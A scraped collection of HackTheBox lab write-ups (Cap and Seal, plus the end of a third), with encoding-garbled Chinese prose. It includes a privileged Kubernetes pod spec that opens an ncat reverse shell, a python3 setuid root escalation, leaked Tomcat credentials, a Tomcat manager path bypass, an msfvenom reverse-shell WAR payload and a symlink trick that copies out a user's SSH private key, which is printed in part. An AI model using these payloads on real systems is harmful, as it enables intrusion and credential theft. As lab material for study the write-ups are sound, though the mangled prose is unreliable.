root.txt\nfd72e8e095033f233d31c383e5c0391b\n```\næˆåŠŸæ‹¿åˆ°rootæƒé™çš„flagæ–‡ä»¶ ## é¢˜å¤–è¯ è¿™å‡ å¤©äº‹æƒ…æœ‰ç‚¹å¤šï¼Œå†åŠ ä¸Šä¸€äº›è¿™æ ·é‚£æ ·çš„æƒ…å†µå§ï¼Œå¯¼è‡´æ¯”è¾ƒå¿™ã€‚æ‰€ä»¥è¿™æ¬¡çš„é¶åœºå°±æ²¡æœ‰å†™çš„éå¸¸ç»†è‡´ï¼Œæœ‰å¾ˆå¤šä¸œè¥¿éƒ½æ˜¯ä¸€ä¸‹å°±ç•¥è¿‡äº†ï¼Œè¯·å¤§å®¶è§è°…ã€‚ç­‰è¿‡æ®µæ—¶é—´å¿™å®Œäº†å°±ä¼šæ¢å¤è´¨é‡ã€‚\n\næœ€åä¸€æ­¥å¦‚æœæƒ³è¦è·å¾—ä¸€ä¸ªshellï¼Œå°±ä½¿ç”¨è¿™ä¸ªè„šæœ¬\n\n```Plain Text\napiVersion: v1\nkind: Pod\nmetadata:\n  name: everything-allowed-revshell-pod\n  labels:\n    app: pentest\nspec:\n  hostNetwork: true\n  hostPID: true\n  hostIPC: true\n  containers:\n  - name: everything-allowed-pod\n    image: raesene/ncat\n    command: [ \"/bin/sh\", \"-c\", \"--\" ]\n    args: [ \"ncat --ssl $HOST $PORT -e /bin/bash;\" ]\n    securityContext:\n      privileged: true\n    volumeMounts:\n    - mountPath: /host\n      name: noderoot\n  #nodeName: k8s-control-plane-node # Force your pod to run on the control-plane node by uncommenting this line and changing to a control-plane node name\n  volumes:\n  - name: noderoot\n    hostPath:\n      path: /\n```","tags":["Hackthebox"]},{"title":"Cap - Hackthebox","url":"/2021/07/17/Hackthebox/Easy/Hackthebox-Cap/","content":"\n# Hackthebox - Cap\nHackTheBoxåœ¨å‡Œæ™¨ä¸‰ç‚¹å‘å¸ƒäº†ä¸€ä¸ªæ–°çš„é¶åœºï¼Œåœ¨æ¼«é•¿çš„ç­‰å¾…ä¹‹åï¼Œé¶æœºä¸Šçº¿äº†ï¼Œç¬¬ä¸€æ—¶é—´è®¿é—®ï¼Œå¼€å¹²\n\n![](Hackthebox-Cap/598bf432-0c5f-475c-84b3-c8df4e777a0b.png)\n\nè¿æ¥vpnä¹‹åæ‰“å¼€ç«™ç‚¹\n\n![](Hackthebox-Cap/c900fdcc-b1b5-4883-ab97-14e2b7eb117e.png)\n\nä¸€åº¦ä»¥ä¸ºå¤åˆ¶é”™äº†ipã€‚ã€‚ã€‚ã€‚ã€‚ã€‚æŸ¥çœ‹ä¿¡æ¯ä¹‹åå‘ç°Security Snapshot(5 Second PCAP + Analysis)\n\nä¸ºæ•°æ®åŒ…å¯ä¸‹è½½\n\n![](Hackthebox-Cap/bffb30b7-95d4-454e-b03e-ffc1c400be58.png)\n\næœæ–­ä¸‹è½½ä¹‹åç”¨wiresharkæ‰“å¼€\n\n![](Hackthebox-Cap/e7107aed-c2aa-4a1c-a022-97f1db54e45f.png)\n\nï¼Ÿï¼Ÿï¼Ÿç©ºç™½ï¼Œè¿™æ€•æ˜¯ä¸‹è½½äº†ä¸ªå‡çš„ï¼Œå’Œæœ‹å‹ç¡®è®¤åå‘ç°æ˜¯å› ä¸ºè¿˜æ²¡æœ‰äº§ç”Ÿæ•°æ®åŒ…ï¼Œåˆ·æ–°ä¹‹å\n\n![](Hackthebox-Cap/e44ee337-3d04-4a41-bbec-8daa50c8a756.png)\n\nå“¦å¼ï¼Œäº§ç”Ÿäº†æ•°æ®åŒ…ï¼Œä¸‹è½½æ‰“å¼€\n\n![](Hackthebox-Cap/705de063-aa36-4c07-a859-ec9a501ba9a4.png)\n\næ•°æ®åŒ…æ²¡å‘ç°æœ‰ç”¨çš„ä¿¡æ¯ï¼Œä½†ä¸‹è½½çš„æ•°æ®åŒ…å‘½åå’Œç½‘å€åç¼€çš„æ•°å­—ç›¸åŒå¼•èµ·äº†æ³¨æ„ï¼Œ\n\n![](Hackthebox-Cap/e20f0014-3251-46de-bcbc-5fd9d19bb074.png)\n\næ—¢ç„¶ç›¸åŒä¸”åˆ·æ–°ä¹‹åå›ç”Ÿæˆæ–°çš„ï¼Œé‚£ä¹ˆä¾¿å¯ä»¥å°è¯•ä¿®æ”¹ï¼Œæœæ–­æ”¹æˆ0ï¼Œ\n\n![](Hackthebox-Cap/03c96b59-df9f-41b6-b601-6730e4ef6301.png)\n\næœç„¶ï¼Œæœ‰äº†ä¿¡æ¯ï¼Œä¸‹è½½ä¹‹åå†æ¬¡ç”¨wiresharkæ‰“å¼€\n\n![](Hackthebox-Cap/48e94750-4a1d-40f0-b6e2-546570589cc3.png)\n\nè¿™ä¸å°±æœ‰äº†å—ï¼ŒæŸ¥çœ‹æ•°æ®åŒ…ï¼ŒæˆåŠŸæ‰¾åˆ°è´¦å·å¯†ç \n\n![](Hackthebox-Cap/a3baa556-c481-45f1-a64e-cc7c5a6daf8b.png)\n\nç”±äºæ•°æ®åŒ…æ˜¯ftpçš„ï¼Œç›´æ¥å°è¯•ç™»å½•ftp\n\n![](Hackthebox-Cap/8eefb9c8-1f87-493d-8955-2f89c0305e9f.png)\n\næˆåŠŸç™»å½•ftpï¼Œæ‹¿åˆ°æ™®é€šç”¨æˆ·flagã€‚æ‰«æç«¯å£å¾—çŸ¥å¼€å¯21ã€22ã€80ç«¯å£\n\n![](Hackthebox-Cap/62f795f4-6343-40a8-8f6c-676e72bdcaa0.png)\n\nå°è¯•ç”¨è¯¥è´¦å·å¯†ç ç™»å½•ssh\n\n![](Hackthebox-Cap/d5c8be59-7a95-44ef-a26e-626d9d7e1ad7.png)\n\næˆåŠŸæ‹¿åˆ°æ™®é€šç”¨æˆ·æƒé™ï¼Œå¼€å§‹ææƒæ‹¿åˆ°rootæƒé™ï¼Œsudo â€“l\n\n![](Hackthebox-Cap/13cc0a0c-6452-4691-9704-0390bf12ff80.png)\n\nè¯¥ç”¨æˆ·ä¸èƒ½åœ¨è¿™å°é¶æœºä¸Šsudoï¼Œè„‘é˜”ç–¼ï¼Œæ¥ç€æ‰¾å…¶ä»–ä¿¡æ¯ï¼Œåœ¨å°è¯•è¿‡suidææƒï¼Œæœ¬åœ°ææƒï¼Œå†…æ ¸ææƒå‡æ— æœåï¼ŒæŠ½äº†æ ¹çƒŸï¼Œæ‰¾ä¸€äº›ææƒç›¸å…³çš„æ–‡ç« \n\nç¬¬äºŒå¤©åœ¨æœ‹å‹çš„å¸®åŠ©ä¸‹åˆ©ç”¨python3ææƒï¼Œä½¿ç”¨python3 -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'å‘½ä»¤\n\n![](Hackthebox-Cap/9bf35bb4-9c4a-4b3b-9b70-7beee16a1393.png)\n\nå¯ä»¥çœ‹åˆ°å·²ç»è·å¾—åˆ°rootæƒé™ï¼Œfindæœç´¢ä¸€ä¸‹å­˜åœ¨çš„å…³äºrootçš„ç›®å½•ï¼Œçœ‹åˆ°/root\n\n![](Hackthebox-Cap/c5c2e81b-487a-4378-af9c-5e7d3f0d18cf.png)\n\n![](Hackthebox-Cap/6a4b0b2d-7cb2-4a76-be4f-249aa67bf6bf.png)\n\nè¿›åˆ°rootç›®å½•çœ‹åˆ°root.txtï¼Œæ‹¿åˆ°rootæƒé™çš„flag\n\n![](Hackthebox-Cap/5a8e946b-f71b-437d-9465-0d3b1d20439e.png)\n\næäº¤ï¼Œå®Œæ´»\n\n![](Hackthebox-Cap/f74e3eeb-26fd-4819-852e-f90966f37b44.png)\n\næ³¨æ„ï¼š 1ã€å…³æ³¨urlçš„å˜åŒ–ï¼Œé‡Œé¢å¯èƒ½å­˜åœ¨æŸäº›ä¿¡æ¯\n\n2ã€åˆ†ææµé‡åŒ…ï¼Œæ‰¾å¯»å…³é”®ä¿¡æ¯\n\n3ã€æ€ç»´æ‰©æ•£ï¼Œæ‰¾å¯»å¯èƒ½å­˜åœ¨å¯åˆ©ç”¨çš„ç‚¹","tags":["Hackthebox"]},{"title":"Seal - Hackthebox","url":"/2021/07/12/Hackthebox/Medium/Hackthebox-Seal/","content":"\n# Hackthebox - Seal\n## é¶åœºä¿¡æ¯\n![](Hackthebox-Seal/image1.png)\n\n## é¶åœºç±»å‹\n![](Hackthebox-Seal/image2.png)\n\n## ä¿¡æ¯æœé›† é¦–å…ˆä½¿ç”¨Nmapè¿›è¡Œä¿¡æ¯æœé›†\n```Plain Text\nnmap -A -sS -sC -sV -p- 10.10.10.250\n```\n```Plain Text\nâ”Œâ”€â”€(rootğŸ’€root)-[~/Desktop]\nâ””â”€# nmap -A -sS -sC -sV -p- 10.10.10.250\nStarting Nmap 7.91 ( https://nmap.org ) at 2021-07-12 12:42 CST\nNmap scan report for 10.10.10.250\nHost is up (0.24s latency).\nNot shown: 65532 closed ports\nPORT     STATE SERVICE    VERSION\n22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   3072 4b:89:47:39:67:3d:07:31:5e:3f:4c:27:41:1f:f9:67 (RSA)\n|   256 04:a7:4f:39:95:65:c5:b0:8d:d5:49:2e:d8:44:00:36 (ECDSA)\n|_  256 b4:5e:83:93:c5:42:49:de:71:25:92:71:23:b1:85:54 (ED25519)\n443/tcp  open  ssl/http   nginx 1.18.0 (Ubuntu)\n|_http-server-header: nginx/1.18.0 (Ubuntu)\n|_http-title: Seal Market\n| ssl-cert: Subject: commonName=seal.htb/organizationName=Seal Pvt Ltd/stateOrProvinceName=London/countryName=UK\n| Not valid before: 2021-05-05T10:24:03\n|_Not valid after:  2022-05-05T10:24:03\n| tls-alpn:\n|_  http/1.1\n| tls-nextprotoneg:\n|_  http/1.1\n8080/tcp open  http-proxy\n| fingerprint-strings:\n|   FourOhFourRequest:\n|     HTTP/1.1 401 Unauthorized\n|     Date: Mon, 12 Jul 2021 05:05:34 GMT\n|     Set-Cookie: JSESSIONID=node01f74sr5qgmlr67kq6xg2imreb3.node0; Path=/; HttpOnly\n|     Expires: Thu, 01 Jan 1970 00:00:00 GMT\n|     Content-Type: text/html;charset=utf-8\n|     Content-Length: 0\n|   GetRequest:\n|     HTTP/1.1 401 Unauthorized\n|     Date: Mon, 12 Jul 2021 05:05:32 GMT\n|     Set-Cookie: JSESSIONID=node071ucs4ccblk71m8qso25gjtua1.node0; Path=/; HttpOnly\n|     Expires: Thu, 01 Jan 1970 00:00:00 GMT\n|     Content-Type: text/html;charset=utf-8\n|     Content-Length: 0\n|   HTTPOptions:\n|     HTTP/1.1 200 OK\n|     Date: Mon, 12 Jul 2021 05:05:33 GMT\n|     Set-Cookie: JSESSIONID=node01dhmxhla4mm47fdkiw6xmfoxq2.node0; Path=/; HttpOnly\n|     Expires: Thu, 01 Jan 1970 00:00:00 GMT\n|     Content-Type: text/html;charset=utf-8\n|     Allow: GET,HEAD,POST,OPTIONS\n|     Content-Length: 0\n|   RPCCheck:\n|     HTTP/1.1 400 Illegal character OTEXT=0x80\n|     Content-Type: text/html;charset=iso-8859-1\n|     Content-Length: 71\n|     Connection: close\n|     <h1>Bad Message 400</h1><pre>reason: Illegal character OTEXT=0x80</pre>\n|   RTSPRequest:\n|     HTTP/1.1 505 Unknown Version\n|     Content-Type: text/html;charset=iso-8859-1\n|     Content-Length: 58\n|     Connection: close\n|     <h1>Bad Message 505</h1><pre>reason: Unknown Version</pre>\n|   Socks4:\n|     HTTP/1.1 400 Illegal character CNTL=0x4\n|     Content-Type: text/html;charset=iso-8859-1\n|     Content-Length: 69\n|     Connection: close\n|     <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x4</pre>\n|   Socks5:\n|     HTTP/1.1 400 Illegal character CNTL=0x5\n|     Content-Type: text/html;charset=iso-8859-1\n|     Content-Length: 69\n|     Connection: close\n|_    <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x5</pre>\n| http-auth:\n| HTTP/1.1 401 Unauthorized\\x0D\n|_  Server returned status 401 but no WWW-Authenticate header.\n|_http-title: Site doesn't have a title (text/html;charset=utf-8).\n1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :\nSF-Port8080-TCP:V=7.91%I=7%D=7/12%Time=60EBCAB6%P=x86_64-pc-linux-gnu%r(Ge\nSF:tRequest,F4,\"HTTP/1\\.1\\x20401\\x20Unauthorized\\r\\nDate:\\x20Mon,\\x2012\\x2\nSF:0Jul\\x202021\\x2005:05:32\\x20GMT\\r\\nSet-Cookie:\\x20JSESSIONID=node071ucs\nSF:4ccblk71m8qso25gjtua1\\.node0;\\x20Path=/;\\x20HttpOnly\\r\\nExpires:\\x20Thu\nSF:,\\x2001\\x20Jan\\x201970\\x2000:00:00\\x20GMT\\r\\nContent-Type:\\x20text/html\nSF:;charset=utf-8\\r\\nContent-Length:\\x200\\r\\n\\r\\n\")%r(HTTPOptions,108,\"HTT\nSF:P/1\\.1\\x20200\\x20OK\\r\\nDate:\\x20Mon,\\x2012\\x20Jul\\x202021\\x2005:05:33\\x\nSF:20GMT\\r\\nSet-Cookie:\\x20JSESSIONID=node01dhmxhla4mm47fdkiw6xmfoxq2\\.nod\nSF:e0;\\x20Path=/;\\x20HttpOnly\\r\\nExpires:\\x20Thu,\\x2001\\x20Jan\\x201970\\x20\nSF:00:00:00\\x20GMT\\r\\nContent-Type:\\x20text/html;charset=utf-8\\r\\nAllow:\\x\nSF:20GET,HEAD,POST,OPTIONS\\r\\nContent-Length:\\x200\\r\\n\\r\\n\")%r(RTSPRequest\nSF:,AD,\"HTTP/1\\.1\\x20505\\x20Unknown\\x20Version\\r\\nContent-Type:\\x20text/ht\nSF:ml;charset=iso-8859-1\\r\\nContent-Length:\\x2058\\r\\nConnection:\\x20close\\\nSF:r\\n\\r\\n<h1>Bad\\x20Message\\x20505</h1><pre>reason:\\x20Unknown\\x20Version\nSF:</pre>\")%r(FourOhFourRequest,F4,\"HTTP/1\\.1\\x20401\\x20Unauthorized\\r\\nDa\nSF:te:\\x20Mon,\\x2012\\x20Jul\\x202021\\x2005:05:34\\x20GMT\\r\\nSet-Cookie:\\x20J\nSF:SESSIONID=node01f74sr5qgmlr67kq6xg2imreb3\\.node0;\\x20Path=/;\\x20HttpOnl\nSF:y\\r\\nExpires:\\x20Thu,\\x2001\\x20Jan\\x201970\\x2000:00:00\\x20GMT\\r\\nConten\nSF:t-Type:\\x20text/html;charset=utf-8\\r\\nContent-Length:\\x200\\r\\n\\r\\n\")%r(\nSF:Socks5,C3,\"HTTP/1\\.1\\x20400\\x20Illegal\\x20character\\x20CNTL=0x5\\r\\nCont\nSF:ent-Type:\\x20text/html;charset=iso-8859-1\\r\\nContent-Length:\\x2069\\r\\nC\nSF:onnection:\\x20close\\r\\n\\r\\n<h1>Bad\\x20Message\\x20400</h1><pre>reason:\\x\nSF:20Illegal\\x20character\\x20CNTL=0x5</pre>\")%r(Socks4,C3,\"HTTP/1\\.1\\x2040\nSF:0\\x20Illegal\\x20character\\x20CNTL=0x4\\r\\nContent-Type:\\x20text/html;cha\nSF:rset=iso-8859-1\\r\\nContent-Length:\\x2069\\r\\nConnection:\\x20close\\r\\n\\r\\\nSF:n<h1>Bad\\x20Message\\x20400</h1><pre>reason:\\x20Illegal\\x20character\\x20\nSF:CNTL=0x4</pre>\")%r(RPCCheck,C7,\"HTTP/1\\.1\\x20400\\x20Illegal\\x20characte\nSF:r\\x20OTEXT=0x80\\r\\nContent-Type:\\x20text/html;charset=iso-8859-1\\r\\nCon\nSF:tent-Length:\\x2071\\r\\nConnection:\\x20close\\r\\n\\r\\n<h1>Bad\\x20Message\\x2\nSF:0400</h1><pre>reason:\\x20Illegal\\x20character\\x20OTEXT=0x80</pre>\");\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.91%E=4%D=7/12%OT=22%CT=1%CU=41179%PV=Y%DS=2%DC=T%G=Y%TM=60EBCAE\nOS:5%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)OPS\nOS:(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST1\nOS:1NW7%O6=M54DST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN\nOS:(R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A\nOS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R\nOS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F\nOS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%\nOS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD\nOS:=S)\n\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 80/tcp)\nHOP RTT       ADDRESS\n1   241.94 ms 10.10.14.1\n2   242.04 ms 10.10.10.250\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 716.52 seconds\n```\nä»ä¸Šé¢çš„æ‰«æç»“æœï¼Œæˆ‘ä»¬å¾—åˆ°äº†å‡ ä¸ªä¿¡æ¯ - å¼€å¯äº†`22`ã€`443`å’Œ`8080`ç«¯å£ - `8080`ç«¯å£æ˜¯ä¸€ä¸ªhttpæœåŠ¡ - `8080`ç«¯å£æ˜¾ç¤º401ï¼Œä½†å¯ä»¥è®¿é—®\n\næˆ‘ä»¬è®¿é—®ä¸€ä¸‹8080ç«¯å£\n\n![](Hackthebox-Seal/image3.png)\n\nå‘ç°è¿™æ˜¯ä¸€ä¸ªç™»å½•æ¡†ï¼Œä½¿ç”¨çš„cmsæ˜¯gitbucket\n\néšä¾¿æ³¨å†Œä¸€ä¸ªè´¦å·ç™»é™†åï¼Œå‘ç°äº†å…³äºnginxå’Œtomcatçš„ä¸œè¥¿ï¼Œç›®å‰æ€€ç–‘è¯¥ç³»ç»Ÿä½¿ç”¨äº†nginxæˆ–è€…tomcatè¿›è¡Œæ­å»º\n\nç™»é™†åå‘ç°äº†ä¸€ä¸ªåä¸ºseal\\_marketçš„repoï¼Œè¿™åº”è¯¥æ˜¯443ç«¯å£çš„ä»£ç åº“ã€‚ä½†æˆ‘ä»¬æ— æ³•é€šè¿‡IPè¿›è¡Œè®¿é—®443ç«¯å£ï¼Œåº”è¯¥æ˜¯éœ€è¦æ·»åŠ ä¸€ä¸ªåŸŸå\n\n```Plain Text\necho 10.10.10.250 seal.htb >> /etc/hosts\n```\n![](Hackthebox-Seal/image4.png)\n\nè¿è¡Œåå‘ç°ç¡®å®8080ç«¯å£çš„gitbucketæ˜¯443ç«¯å£çš„ä»£ç åº“\n\n![](Hackthebox-Seal/image5.png)\n\næˆ‘ä»¬åœ¨8080ç«¯å£ä¸Šå¯ä»¥çœ‹åˆ°æœ‰ä¸€äº›å¾…åŠäº‹é¡¹\n\n```Plain Text\nRemove mutual authentication for dashboard, setup registration and login features.\nDeploy updated tomcat configuration.\nDisable manager and host-manager.\n```\n![](Hackthebox-Seal/image6.png)\n\nåœ¨å°è¯•æ›´æ–°\n\n```Plain Text\ntomcat/tomcat-users.xml\n```\næ–‡ä»¶çš„æ—¶å€™ï¼Œæ‰¾åˆ°äº†tomcatçš„è´¦å·å¯†ç \n\n```Plain Text\nhttp://10.10.10.250:8080/root/seal_market/commit/971f3aa3f0a0cc8aac12fd696d9631ca540f44c7\nusername = tomcat\npassword = 42MrHBf*z8{Z%\n```\n![](Hackthebox-Seal/image7.png)\n\nåœ¨å°è¯•æŸ¥çœ‹robots.txtçš„æ—¶å€™ï¼Œæç¤º404ï¼Œä½†ä»è¿™ä¸ª404çŠ¶æ€é¡µé¢æˆ‘ä»¬å¯ä»¥çŸ¥é“ï¼Œè¯¥æœåŠ¡å™¨ä½¿ç”¨äº†tomcatï¼Œå¹¶ä¸”æˆ‘ä»¬æ‰‹é‡Œæ‹¿åˆ°äº†tomcatçš„è´¦å·å¯†ç ï¼Œé‚£æˆ‘ä»¬å°±ç›´æ¥ç™»å½•å§\n\n```Plain Text\nhttps://seal.htb/manager/status\n```\nç›´æ¥ä½¿ç”¨tomcaté»˜è®¤çš„åœ°å€è¿›è¡Œç™»å½•ï¼Œç„¶åè¿›åˆ°äº†tomcatçš„ç®¡ç†é¡µé¢ ## æ¼æ´åˆ©ç”¨\n\n```Plain Text\nhttps://seal.htb/manager/status/..;/html\n```\næˆ‘ä»¬ç›´æ¥ä½¿ç”¨msfvenomç”Ÿæˆä¸€ä¸ªwaré©¬ï¼Œç„¶åä¸Šä¼ åˆ©ç”¨å³å¯\n\n```Plain Text\nmsfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.24 LPORT=4444 -f war -o shell.war\n```\nç„¶åå»ä¸Šä¼ åˆ°é¶æœºé‡Œ\n\n![](Hackthebox-Seal/image8.png)\n\nä¸Šä¼ çš„æ—¶å€™æç¤º403ï¼Œæœ‰ç‚¹è¿·æƒ‘ã€‚\n\nç»è¿‡å„ç§å°è¯•åå‘ç°ï¼Œè¿™æ˜¯ç™½åå•è¿‡æ»¤ï¼Œå’±ä»¬éœ€è¦æŠ“åŒ…ç„¶åç»•è¿‡ä¸€ä¸‹\n\n```Plain Text\nåŸURL\nPOST /manager/html/upload;jsessionid=55F7E6377E4EE40C4466AB9F3403C5C9?org.apache.catalina.filters.CSRF_NONCE=229A49D013A85C24C1703530CB2440AD HTTP/1.1\n```\n```Plain Text\nä¿®æ”¹ä¸º\nPOST /manager/status/..;/html/upload;jsessionid=55F7E6377E4EE40C4466AB9F3403C5C9?org.apache.catalina.filters.CSRF_NONCE=229A49D013A85C24C1703530CB2440AD HTTP/1.1\n```\n![](Hackthebox-Seal/image9.png)\n\nå’±ä»¬å¯ä»¥çœ‹åˆ°ï¼ŒshellæˆåŠŸä¸Šä¼ ï¼Œå’±ä»¬æœ¬åœ°ä½¿ç”¨ncç›‘å¬ä¸€ä¸ªç«¯å£\n\n```Plain Text\nnc -nvlp 4444\n```\nç„¶åè®¿é—®ä¸€ä¸‹shellé¡µé¢\n\n```Plain Text\nhttps://seal.htb/shell/\n```\nä½¿ç”¨python3è·å–ä¸€ä¸ªç¨³å®šçš„shellé“¾æ¥\n\n```Plain Text\npython3 -c 'import pty;pty.spawn(\"/bin/bash\");'\n```\næˆåŠŸè·å¾—ä¸€ä¸ªshell\n\n```Plain Text\nâ”Œâ”€â”€(rootğŸ’€root)-[~/Desktop]\nâ””â”€# nc -nvlp 4444\nlistening on [any] 4444 ...\nconnect to [10.10.14.24] from (UNKNOWN) [10.10.10.250] 32984\npython3 -c 'import pty;pty.spawn(\"/bin/bash\");'\ntomcat@seal:/var/lib/tomcat9$\n```\n```Plain Text\ntomcat@seal:/home/luis$ ls -la\nls -la\ntotal 51320\ndrwxr-xr-x 9 luis luis     4096 May  7 07:01 .\ndrwxr-xr-x 3 root root     4096 May  5 12:52 ..\ndrwxrwxr-x 3 luis luis     4096 May  7 06:00 .ansible\nlrwxrwxrwx 1 luis luis        9 May  5 12:57 .bash_history -> /dev/null\n-rw-r--r-- 1 luis luis      220 May  5 12:52 .bash_logout\n-rw-r--r-- 1 luis luis     3797 May  5 12:52 .bashrc\ndrwxr-xr-x 3 luis luis     4096 May  7 07:00 .cache\ndrwxrwxr-x 3 luis luis     4096 May  5 13:45 .config\ndrwxrwxr-x 6 luis luis     4096 Jul 12 06:14 .gitbucket\n-rw-r--r-- 1 luis luis 52497951 Jan 14 02:51 gitbucket.war\ndrwxrwxr-x 3 luis luis     4096 May  5 13:41 .java\ndrwxrwxr-x 3 luis luis     4096 May  5 14:33 .local\n-rw-r--r-- 1 luis luis      807 May  5 12:52 .profile\ndrwx------ 2 luis luis     4096 May  7 06:10 .ssh\n-r-------- 1 luis luis       33 Jul 12 06:15 user.txt\n```\nåœ¨ç”¨æˆ·ç›®å½•luisä¸‹æ‰¾åˆ°äº†user.txtæ–‡ä»¶ï¼Œä½†æˆ‘ä»¬æ²¡æœ‰æƒé™è®¿é—®ï¼Œä¸è¿‡å­˜åœ¨ä¸€ä¸ª.sshç›®å½•ï¼Œå¹¶ä¸”æˆ‘ä»¬æ˜¯æœ‰æƒé™è¿›è¡Œè®¿é—®çš„ï¼Œæˆ‘ä»¬è®¿é—®çœ‹çœ‹\n\nåœ¨ç›®å½•`/opt/backups/playbook`ä¸­ï¼Œæ‰¾åˆ°äº†ä¸€ä¸ª`rum.yml`æ–‡ä»¶ï¼Œå’±ä»¬æŸ¥çœ‹ä¸€ä¸‹å†…å®¹\n\n```Plain Text\n- hosts: localhost\n  tasks:\n  - name: Copy Files\n    synchronize: src=/var/lib/tomcat9/webapps/ROOT/admin/dashboard dest=/opt/backups/files copy_links=yes\n  - name: Server Backups\n    archive:\n      path: /opt/backups/files/\n      dest: \"/opt/backups/archives/backup-{{ansible_date_time.date}}-{{ansible_date_time.time}}.gz\"\n  - name: Clean\n    file:\n      state: absent\n      path: /opt/backups/files/\n```\næ€è·¯è¿™ä¸å°±æ¥äº†å—\\~\n\næ ¹æ®è§£è¯»`run.yml`æ–‡ä»¶ï¼Œå’±ä»¬å¯ä»¥åˆ›å»ºä¸€ä¸ªæŒ‡å‘`luis`çš„`id_rsa`çš„é“¾æ¥ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠå®ƒæ”¾åˆ°`/uploads`ç›®å½•ä¸­\n\n```Plain Text\n/opt/backups/archives\nln -s ~/home/luis/.ssh/id_rsa /var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads/id_rsa\ncp backup-2021-07-12-08:46:33.gz /dev/shm\ncd /dev/shm\nmv backup-2021-07-12-08:46:33.gz backup.tar.gz\ntar -xvf backup.tar.gz\n```\nåœ¨ç›®å½•`/dev/shm/dashboard/uploads`ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°æˆ‘ä»¬çš„id\\_rsaæ–‡ä»¶ï¼Œæˆ‘ä»¬æŸ¥çœ‹ä¸€ä¸‹å†…å®¹\n\n```Plain Text\n-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn\nNhAAAAAwEAAQAAAYEAs3kISCeddKacCQhVcpTTVcLxM9q2iQKzi9hsnlEt0Z7kchZrSZsG\nDkID79g/4XrnoKXm2ud0gmZxdVJUAQ33Kg3Nk6czDI0wevr/YfBpCkXm5rsnfo5zjEuVGo\nMTJhNZ8iOu7sCDZZA6sX48OFtuF6zuUgFqzHrdHrR4+YFawgP8OgJ9NWkapmmtkkxcEbF4\nn1+v/l+74kEmti7jTiTSQgPr/ToTdvQtw12+YafVtEkB/8ipEnAIoD/B6JOOd4pPTNgX8R\nMPWH93mStrqblnMOWJto9YpLxhM43v9I6EUje8gp/EcSrvHDBezEEMzZS+IbcP+hnw5ela\nduLmtdTSMPTCWkpI9hXHNU9njcD+TRR/A90VHqdqLlaJkgC9zpRXB2096DVxFYdOLcjgeN\n3rcnCAEhQ75VsEHXE/NHgO8zjD2o3cnAOzsMyQrqNXtPa+qHjVDch/T1TjSlCWxAFHy/OI\nPxBupE/kbEoy1+dJHuR+gEp6yMlfqFyEVhUbDqyhAAAFgOAxrtXgMa7VAAAAB3NzaC1yc2\nEAAAGBALN5CEgnnXSmnAkIVXKU01XC8TPatokCs4vYbJ5RLdGe5HIWa0mbBg5CA+/YP+F6\n56Cl5trndIJmcXVSVAEN9yoNzZOnMwyNMHr6/2HwaQpF5ua7J36Oc4xLlRqDEyYTWfIjru\n7Ag2WQOrF+PDhbbhes7lIBasx63R60ePmBWsID/DoCfTVpGqZprZJMXBGxeJ9fr/5fu+JB\nJrYu404k0kID6/06E3b0LcNdvmGn1bRJAf/IqRJwCKA/weiTjneKT0zYF/ETD1h/d5kra6\nm5ZzDlibaPWKS8YTON7/SOhFI3vIKfxHEq7xwwXsxBDM2UviG3D/oZ8OXpWnbi5rXU0jD0\nwlpKSPYVxzVPZ43A/k0UfwPdFR6nai5WiZIAvc6UVwdtPeg1cRWHTi3I4Hjd63JwgBIUO+\nVbBB1xPzR4DvM4w9qN3JwDs7DMkK6jV7T2vqh41Q3If09U40pQlsQBR8vziD8QbqRP5GxK\nMtfnSR7kfoBKesjJX6hchFYVGw6soQAAAAMBAAEAAAGAJuAsvxR1svL0EbDQcYVzUbxsaw\nMRTxRauAwlWxXSivmUGnJowwTlhukd2TJKhBkPW2kUXI6OWkC+it9Oevv/cgiTY0xwbmOX\nAMylzR06Y5NItOoNYAiTVux4W8nQuAqxDRZVqjnhPHrFe/UQLlT/v/khlnngHHLwutn06n\nbupeAfHqGzZYJi13FEu8/2kY6TxlH/2WX7WMMsE4KMkjy/nrUixTNzS+0QjKUdvCGS1P6L\nhFB+7xN9itjEtBBiZ9p5feXwBn6aqIgSFyQJlU4e2CUFUd5PrkiHLf8mXjJJGMHbHne2ru\np0OXVqjxAW3qifK3UEp0bCInJS7UJ7tR9VI52QzQ/RfGJ+CshtqBeEioaLfPi9CxZ6LN4S\n1zriasJdAzB3Hbu4NVVOc/xkH9mTJQ3kf5RGS